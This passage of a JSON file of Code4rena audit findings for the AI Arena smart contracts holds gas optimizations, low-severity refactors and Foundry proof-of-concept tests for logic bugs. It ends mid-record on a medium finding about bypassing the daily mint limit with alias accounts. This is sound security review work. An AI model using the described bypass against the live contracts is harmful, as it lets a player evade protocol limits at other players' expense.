      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32226",
      "title": "[G-09] `RankedBattle._addResultPoints()` executes unnecessary lines of code in case of a tie",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L425-L439\n\n### Description\n\n`RankedBattle._addResultPoints()` runs all of the below code in case of a tie; it's all setup for the win/lose code blocks, which make up the rest of the function. There's no more code that runs in case of a tie. The only state modification in this function in case of a tie is updating the stakingFactor if it was not already updated, but since points/stake does not change in case of a tie the update is not necessary.\n```solidity\n        uint256 stakeAtRisk;\n        uint256 curStakeAtRisk;\n        uint256 points = 0;\n\n        /// Check how many NRNs the fighter has at risk\n        stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);\n\n        /// Calculate the staking factor if it has not already been calculated for this round \n        if (_calculatedStakingFactor[tokenId][roundId] == false) {\n            stakingFactor[tokenId] = _getStakingFactor(tokenId, stakeAtRisk);\n            _calculatedStakingFactor[tokenId][roundId] = true;\n        }\n\n        /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract\n        curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;\n        // THE REST OF THE CODE IN THIS FUNCTION ONLY RUNS IN CASE OF A WIN OR LOSS\n```\n### Recommended Fix\n\nCut the code above and paste it at the top of both the win and lose blocks.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32225",
      "title": "[G-08] `RankedBattle._addResultPoints()` can put code inside an existing conditional statement to avoid incrementing storage variables by zero",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L466-L471\n\n### Description\n\nSee the following code from the `RankedBattle._addResultPoints()` below. The `points` variable can be zero, such as if the player's `mergingFactor` is 100. The lines updating storage variables with `points` should be put inside the `if` block.\n\n```solidity\n            accumulatedPointsPerFighter[tokenId][roundId] += points;\n            accumulatedPointsPerAddress[fighterOwner][roundId] += points;\n            totalAccumulatedPoints[roundId] += points;\n            if (points > 0) {\n                emit PointsChanged(tokenId, points, true);\n            }\n```\n\n### Recommended Fix\n\n```diff\n-           accumulatedPointsPerFighter[tokenId][roundId] += points;\n-           accumulatedPointsPerAddress[fighterOwner][roundId] += points;\n-           totalAccumulatedPoints[roundId] += points;\n            if (points > 0) {\n+               accumulatedPointsPerFighter[tokenId][roundId] += points;\n+               accumulatedPointsPerAddress[fighterOwner][roundId] += points;\n+               totalAccumulatedPoints[roundId] += points;\n                emit PointsChanged(tokenId, points, true);\n            }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32224",
      "title": "[G-07] `RankedBattle.updateBattleRecord()` doesn't need to check voltage since `VoltageManager.spendVoltage()` will revert if voltage is too low",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L334-L338<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/VoltageManager.sol#L110\n\n### Description\n\n`updateBattleRecord()` checks that the initiator's voltage is sufficient:\n```solidity\n        require(\n            !initiatorBool ||\n            _voltageManagerInstance.ownerVoltageReplenishTime(fighterOwner) <= block.timestamp || \n            _voltageManagerInstance.ownerVoltage(fighterOwner) >= VOLTAGE_COST\n        );\n```\nThis check is not necessary, since `VoltageManager.spendVoltage()` will revert if the voltage is too low:\n```solidity\n    function spendVoltage(address spender, uint8 voltageSpent) public {\n        require(spender == msg.sender || allowedVoltageSpenders[msg.sender]);\n        if (ownerVoltageReplenishTime[spender] <= block.timestamp) {\n            _replenishVoltage(spender);\n        }\n        ownerVoltage[spender] -= voltageSpent; // UNDERFLOWS AND REVERTS IF VOLTAGE IS TOO LOW\n        emit VoltageRemaining(spender, ownerVoltage[spender]);\n    }\n```\nNote that this check can also be performed offchain before calling `updateBattleRecord()`.\n\n### Recommended Fix\n\nRemove the require statement.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32223",
      "title": "[G-06] `RankedBattle.claimNRN()` is gas inefficient for addresses that don't have any points in previous rounds",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L294-L311\n\n### Description\n\nThe for loop in `claimNRN()` will start at zero for new users and spend thousands of gas accessing/setting storage in each loop, although the user will not have any rewards in earlier rounds.\n\n```solidity\n    function claimNRN() external {\n        require(numRoundsClaimed[msg.sender] < roundId, \"Already claimed NRNs for this period\");\n        uint256 claimableNRN = 0;\n        uint256 nrnDistribution;\n        uint32 lowerBound = numRoundsClaimed[msg.sender];\n        for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {\n            nrnDistribution = getNrnDistribution(currentRound);\n            claimableNRN += (\n                accumulatedPointsPerAddress[msg.sender][currentRound] * nrnDistribution   \n            ) / totalAccumulatedPoints[currentRound];\n            numRoundsClaimed[msg.sender] += 1;\n        }\n```\n### Recommended Fix\n\nAllow users to set their `numRoundsClaimed` to an arbitrary value.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32222",
      "title": "[G-05] NRN `success` checks are unnecessary because the OZ implementation will not fail without reverting",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L284\n\n### Description\n\nThe pattern in the link provided (checking for NRN transfer success) is used widely in the codebase, but these checks are unnecessary since transfers won't fail without reverting.\n\n### Recommended Fix\n\nRemove the NRN `success` checks.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32221",
      "title": "[G-04] `RankedBattle._getStakingFactor()` accesses the same storage variable a second time whenever it's called (in `stakeNRN()`, `unstakeNRN()`, and `updateBattleRecord()`)",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L528<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L253-L258<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L272-L277<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L342\n\n### Description\n\n`RankedBattle._getStakingFactor()` accesses the storage variable `amountStaked[tokenId]` after the three mentioned functions access the same variable (see links). This variable should be cached to decrease storage reads and gas costs.\n\n### Recommended Fix\n\nCache `amountStaked[tokenId]` and pass it to `_getStakingFactor()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32220",
      "title": "[G-03] `Neuron.burnFrom()` allowance check is not necessary",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/Neuron.sol#L196-L204\n\n### Description\n\nNote below that if the amount exceeds the allowance, the `decreasedAllowance` calculation will underflow and cause a revert. The `require` allowance check can be removed.\n```solidity\n    function burnFrom(address account, uint256 amount) public virtual {\n        require(\n            allowance(account, msg.sender) >= amount, \n            \"ERC20: burn amount exceeds allowance\"\n        );\n        uint256 decreasedAllowance = allowance(account, msg.sender) - amount;\n        _burn(account, amount);\n        _approve(account, msg.sender, decreasedAllowance);\n    }\n```\n### Recommended Fix\n\nRemove the require statement.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32219",
      "title": "[G-02] `Neuron.claim()` can call code in `transferFrom()` implementation directly instead of calling `transferFrom()`",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/token/ERC20/ERC20.sol#L158-L163<br>\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/Neuron.sol#L143\n\n### Description\n\nSee the OZ `transferFrom()` implementation:\n```solidity\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n```\n`Neuron.claim()` can run the above code directly without spending extra gas for the function call and to cache `msg.sender`.\n\n### Recommended Fix\n\n```diff\n    function claim(uint256 amount) external {\n        require(\n            allowance(treasuryAddress, msg.sender) >= amount, \n            \"ERC20: claim amount exceeds allowance\"\n        );\n-       transferFrom(treasuryAddress, msg.sender, amount);\n+       _spendAllowance(treasuryAddress, msg.sender, amount);\n+       _transfer(treasuryAddress, msg.sender, amount);\n        emit TokensClaimed(msg.sender, amount);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32218",
      "title": "[G-01]`Neuron.claim()` allowance check is not necessary because `transferFrom()` also checks allowance",
      "impact": "GAS",
      "content": "\n### Links\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/main/src/Neuron.sol#L139-L142\n\n### Description\n\nThe require statement below can be removed since `transferFrom()` will check/update the allowance.\n```solidity\n    function claim(uint256 amount) external {\n        require(\n            allowance(treasuryAddress, msg.sender) >= amount, \n            \"ERC20: claim amount exceeds allowance\"\n        );\n        transferFrom(treasuryAddress, msg.sender, amount);\n        emit TokensClaimed(msg.sender, amount);\n    }\n```\n\n### Recommended Fix\n\nDelete the require statement.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32217",
      "title": "[18] Players lose their current voltage when using a battery",
      "impact": "LOW",
      "content": "\n*Note: At the judgeâ€™s request [here](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1695#issuecomment-1978456865), this downgraded issue from the same warden has been included in this report for completeness.*\n\nhttps://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/VoltageManager.sol#L93-L99\n\nWhen players deplete their voltage through battles, they have the option to replenish it using a **voltage battery**. Although the maximum voltage capacity is 100, and each battle reduces it by 10, the `useVoltageBattery()` function resets the voltage to 100, disregarding any remaining voltage a player has.\n\n```sol\nownerVoltage[msg.sender] = 100;\n```\n\nFrom a design point of view it looks good to have the number 100 as max and 0 as min value for voltage. But in this situation it is doing players a disservice.\n\n### Root cause \n\nThe core issue arises from the function overwriting the existing voltage value instead of incrementally adding to it.\n\n### Impact\n\n**Voltage batteries**, as valuable **paid** items, enable more frequent participation in ranking matches. However, players risk losing up to 90% of their replenished voltage due to the current implementation, leading to potential losses in NRN (the game's currency).\n\n### Scenario\n\nShould a player replenish their voltage without checking their current level, they risk using a battery without receiving its full value, thereby not maximizing the item's cost-effectiveness.\n\n### Proof of Concept\n\nIn `VoltageManager.t.sol`:\n```sol\nfunction testLoseVoltageFromBattery() public {\n  address player = _ownerAddress;\n  uint8 voltageSpendAmount = 10;\n  _mintGameItemForReceiver(player);\n  uint256 currentVoltage = _voltageManagerContract.ownerVoltage(player);\n  assertEq(currentVoltage, 0);\n\n  // battery gives full 100 voltage\n  _voltageManagerContract.useVoltageBattery();\n  _voltageManagerContract.spendVoltage(player, voltageSpendAmount);\n  assertEq(_voltageManagerContract.ownerVoltage(player), 100 - voltageSpendAmount); // 10 voltage just spent\n\n  // Call use battery again, for whatever reason\n  _voltageManagerContract.useVoltageBattery();\n  // battery gave only 10 voltage\n  assertEq(_voltageManagerContract.ownerVoltage(player), 100);\n}\n```\n\n### Suggested Mitigation\nModify the function to add the voltage battery's value to the existing voltage, rather than resetting it:\n```diff\nfunction useVoltageBattery() public {\n...\n- ownerVoltage[msg.sender] = 100;\n+ ownerVoltage[msg.sender] += 100;\n...\n}\n```\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1695#issuecomment-1978456865):**\n> **01**: Good, refactor (explained the impact)\n> **02:** Refactor\n> **03:** Refactor\n> **04:** Refactor\n> **05:** Low\n> **06:** Refactor\n> **07:** Non-critical\n> **08:** Refactor\n> **09/14:** Refactor/Non-critical\n> **10:** Refactor\n> **11/12:** Low/Refactor\n> **13:** Refactor/Non-critical\n> **15:** Refactor\n> **16:** Non-critical\n> **17:** Non-critical\n> **18:** Low\n> \n> Overall very good and targeted recommendations, found them rather meaningful.\n\n**[brandinho (AI Arena) acknowledged](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1695#issuecomment-2018920154)**\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32216",
      "title": "[17] Consider replacing decimal multiplier with `ether` keyword",
      "impact": "LOW",
      "content": "\nSince ether contains 18 decimals it is possible to use the `ether` keyword when describing NRN values. It is shorter and conveys the amount just as well.\n\nExample:\n```diff\n- uint256 stakeAmount = 3_000 * 10 ** 18;\n+ uint256 stakeAmount = 3_000 ether;\n```\n\nA simple string replace will update all instances correctly, with the exception of 1, which is easy to do manually.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32215",
      "title": "[16] Simplify assert statements",
      "impact": "LOW",
      "content": "\nSome assert statements are being unnecessarily complicated, there are overloads that support all cases for comparison of native types. Using the correct APIs increases the readability and expressiveness of code. There are many instances where assert calls can be improved, below I have outlined some general examples.\n\nIn the following lines, the `==` operator can be omitted:\n```diff\n- assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);\n+ assertEq(_mergingPoolContract.winnerAddresses(0, 0), _ownerAddress);\n\n- assertEq(mintPass.totalSupply() == mintPass.numTokensOutstanding(), true);\n+ assertEq(mintPass.totalSupply(), mintPass.numTokensOutstanding());\n\n```\n\nHere a specialised assert can be used:\n```diff\n- assertEq(mintPass.mintingPaused(), true);\n+ assertTrue(mintPass.mintingPaused());\n```\n\n> See `forge-std/lib/ds-test/src/test.sol` for all assert overloads.\n\nAvoid using the Solidity native assert statement, when you can use the APIs from Forge:\n```diff\n- assert(_helperContract.attributeToDnaDivisor(\"head\") != 99);\n+ assertNotEq(_helperContract.attributeToDnaDivisor(\"head\"), 99);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32214",
      "title": "[15] Improvements to `updateBattleRecord` function",
      "impact": "LOW",
      "content": "\nCreate a `BattleResult` enum and use it instead of `uint8`. This will improve the code readability. It will be easy to understand if we're looking in the case of a `win` and additional comments like `/// If the user won the match` will become unnecessary, as the code will be self-documenting.\n\n```diff\n+ enum BattleResult {\n+   win,\n+   tie,\n+   loss\n+ }\n\nfunction updateBattleRecord(\n  ...\n- uint8 battleResult,\n+ BattleResult battleResult,\n  ...\n)\n```\n\nRename `updateBattleRecord` parameter:\n```diff\nfunction updateBattleRecord(\n  ...\n- bool initiatorBool,\n+ bool isInitiator,\n  ...\n)\n```\nIt will convey better the purpose of the variable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32213",
      "title": "[14] Misleading function names in `RankedBattle.sol`",
      "impact": "LOW",
      "content": "\nRename `instantiateNeuronContract` to `setNeuronContract`, to reflect what the function is actually doing.\nUpdate the natspec:\n```diff\n- /// @notice Instantiates the neuron contract.\n+ /// @notice Sets the neuron contract.\n```\n\nRename `instantiateMergingPoolContract` to `setMergingPoolContract`, to reflect what the function is actually doing.\nUpdate the natspec:\n```diff\n- /// @notice Instantiates the merging pool contract.\n+ /// @notice Sets the merging pool contract.\n```\n\nRename `setNewRound()` to `beginNewRound()`. As prefix set implies the caller will specify a roundId, which is not the case. The function actually increments the roundId.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32212",
      "title": "[13] Common setup code in tests can be extracted to a base class",
      "impact": "LOW",
      "content": "\nCurrently, there is a lot of duplicated setup code and variables in the tests. See the setup of:\n- `AiArenaHelper.t.sol`\n- `FighterFarm.t.sol`\n- `MergingPool.t.sol`\n- `RankedBattle.t.sol`\n- `StakeAtRisk.t.sol`\n- `VoltageManager.t.sol`\n\nThis can be avoided by creating a Base contract that contains common setup and then each Test contract will do only its own specific configuration.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32211",
      "title": "[12] Incorrect doc string for variable in `MergingPool.sol`",
      "impact": "LOW",
      "content": "\n```diff\n- /// @notice Mapping of address to fighter points.\n+ /// @notice Mapping of fighterId to fighter points.\nmapping(uint256 => uint256) public fighterPoints;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32210",
      "title": "[11] Missing notice tag in natspec for variables in `MergingPool.sol`",
      "impact": "LOW",
      "content": "\n```diff\n- /// The address that has owner privileges (initially the contract deployer).\n+ /// @notice The address that has owner privileges (initially the contract deployer).\naddress _ownerAddress;\n\n- /// The address of the ranked battle contract.\n+ /// @notice The address of the ranked battle contract.\naddress _rankedBattleAddress;\n```\n\n> Default tag is @notice, but it's nice to be consistent with the other natspecs.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32209",
      "title": "[10] Send zero bytes as data argument when minting",
      "impact": "LOW",
      "content": "\nIt's unusual to have an arbitrary string as the data parameter of the `_mint` function. Replace `bytes(\"random\")` with `\"0x\"`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32208",
      "title": "[09] Fix misleading function name and natspec in `GameItems.sol`",
      "impact": "LOW",
      "content": "\nThe function `instantiateNeuronContract` should be renamed to `setNeuronContract`, because it conveys what the function actually does.\n\nAdditionally, update the comment, to be more accurate:\n```diff\n- /// @notice Sets the Neuron contract address and instantiates the contract.\n+ /// @notice Sets the Neuron contract address.\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32207",
      "title": "[08] Rename `dendroidBool` to `isDendroid`",
      "impact": "LOW",
      "content": "\nVariable containing its type is redundant in statically typed languages. `is` prefix is common convention for boolean values.\n\nAlternatively, replace the value with `uint8 fighterType`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32206",
      "title": "[07] Extract constant for custom attributes in `FighterFarm.sol`",
      "impact": "LOW",
      "content": "\nAs mentioned by the developers the value 100 is used for custom attributes:\n> guppy â€” 02/11/2024 3:50 PM\n   100 is a flag we use to determine if itâ€™s a custom attribute or not\n\nTo avoid sprinkling literals in the codebase and improve it's readability it is recommended to extract this literal to a constant, something like this:\n```sol\n/// @notice Special value for custom attributes\nuint256 private constant CUSTOM_ATTRIBUTE = 100\n```\n\nAnd replacing it in the following lines: [here](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L219), [here](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L259) and [here](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L499).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32205",
      "title": "[06] Misleading function names in `FighterFarm.sol`",
      "impact": "LOW",
      "content": "\nThe following functions should be renamed:\n`instantiateAIArenaHelperContract` to `setAIArenaHelperContract`\n`instantiateMintpassContract` to `setMintpassContract`\n`instantiateNeuronContract` to `setNeuronContract`\n\nSince they are not actually instantiating anything, `set` would be a more appropriate prefix. Just like it is done in `setMergingPoolAddress` and `setTokenURI`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32204",
      "title": "[05] `getFighterPoints` view function is unusable",
      "impact": "LOW",
      "content": "\nThe `getFighterPoints` function is created as a helper, to produce a list of the fighters' points. The issue with it is that it allocates the resulting array with only 1 item. This makes it impossible to use for any practical purposes, because client code would be interested in more fighters than the first one.\n\nAnother concern with the function is that it could become impossible to use if enough fighters are created. A big enough array would DoS the function. Consider providing it with a range of indices.\n\nIn this way you would limit the return data.\n\n**PoC**\n```sol\nfunction testIndexOOB() public {\n  address user1 = makeAddr(\"user1\");\n  address user2 = makeAddr(\"user2\");\n  _mintFromMergingPool(_ownerAddress);\n  _mintFromMergingPool(user1);\n  _mintFromMergingPool(user2);\n\n  vm.startPrank(address(_rankedBattleContract));\n  _mergingPoolContract.addPoints(0, 100);\n  _mergingPoolContract.addPoints(1, 100);\n  _mergingPoolContract.addPoints(2, 100);\n  assertEq(_mergingPoolContract.totalPoints(), 300);\n  vm.stopPrank();\n  \n  // fighter points contains values for 3 fighters, but when we ask for 2 or 3, it fails\n  vm.expectRevert(stdError.indexOOBError);\n  uint256[] memory fighterPoints = _mergingPoolContract.getFighterPoints(2);\n  assertEq(fighterPoints.length, 2);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32203",
      "title": "[04] There are no functions for adjusting `GameItemAttributes`",
      "impact": "LOW",
      "content": "\nIn the event of misconfigured item, promotions/discounts, balance adjustments a new item with the same name needs to be created. Adding function to update parameter/s is going to make resolution of such situations straight-forward.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32202",
      "title": "[03] Missing checks for game item invariants when calling `createGameItem`",
      "impact": "LOW",
      "content": "\nIt is possible for an item to have infinite supply (`finiteSupply == false`) and have `itemsRemaining > 0`.\n\nAdd:\n```sol\nif(finiteSupply && itemsRemaining > 0) {\n  revert(\"Conflicting item parameters\");\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32201",
      "title": "[02] Missing functions to change the treasury in various contracts",
      "impact": "LOW",
      "content": "\nThe `treasuryAddress` receives an initial mint of NRN and subsequently smaller transfers of the currency. \n\nIn the situation of a security breach, protocol ownership change or some other unforeseen events it could be troublesome that the treasury address can't change. A fallback mechanism is necessary, just like one exists for changing the **owner**.\n\n**Suggested mitigation**\nEither add `setTreasury(address)` function, callable only by the owner, in the following contracts:\n- `FighterFarm.sol`\n- `GameItems.sol`\n- `Neuron.sol`\n- `StakeAtRisk.sol` \n\nOr make all of them reference the treasury from the `Neuron` contract, since they all have a reference to it, and have `setTreasury(address)` only in `Neuron.sol`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32200",
      "title": "[01] Improve security posture of `_delegatedAddress` in `FighterFarm.sol`",
      "impact": "LOW",
      "content": "\nThe `_delegatedAddress` field represents the backend's address, responsible for signing various messages related to `claimFighters` .  There are two issues with it, which increase the risk for the protocol.\n\n1. `_delegatedAddress` is being set only once, in the constructor, and there is no check if its `address(0)`. In the off-chance of this value being misconfigured any signature would be able to mint a fighter.\n2. In the event of a security breach on the backend, there is no way to change the `_delegatedAddress`. This means a hacker could mint as many and whatever kind of fighter they would like.\n\n**Suggested mitigation**\n- Add require check in `FighterFarm`'s constructor\n```diff\n+ require(_delegatedAddress != address(0), \"Invalid delegated address\");\n```\n- Add  `setDelegatedAddress(address) external` function, which should be callable only by the owner, similar to the already existing `setMergingPoolAddress(address)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32199",
      "title": "[M-09] Constraints of `dailyAllowanceReplenishTime` and `allowanceRemaining` during `mint()` can be bypassed by using alias accounts & `safeTransferFrom()`",
      "impact": "MEDIUM",
      "content": "\nThe [mint()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L158-L161) function in `GameItems.sol` constraints a user from minting more than 10 game items in 1 day. This constraint can easily be bypassed since a similar check is missing inside the [safeTransferFrom()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/GameItems.sol#L291-L303) function:\n\n<details>\n\n```js\n  File: src/GameItems.sol\n\n  147:              function mint(uint256 tokenId, uint256 quantity) external {\n  148:                  require(tokenId < _itemCount);\n  149:                  uint256 price = allGameItemAttributes[tokenId].itemPrice * quantity;\n  150:                  require(_neuronInstance.balanceOf(msg.sender) >= price, \"Not enough NRN for purchase\");\n  151:                  require(\n  152:                      allGameItemAttributes[tokenId].finiteSupply == false || \n  153:                      (\n  154:                          allGameItemAttributes[tokenId].finiteSupply == true && \n  155:                          quantity <= allGameItemAttributes[tokenId].itemsRemaining\n  156:                      )\n  157:                  );\n  158: @--->            require(\n  159: @--->                dailyAllowanceReplenishTime[msg.sender][tokenId] <= block.timestamp || \n  160: @--->                quantity <= allowanceRemaining[msg.sender][tokenId]\n  161:                  );\n  162:          \n  163:                  _neuronInstance.approveSpender(msg.sender, price);\n  164:                  bool success = _neuronInstance.transferFrom(msg.sender, 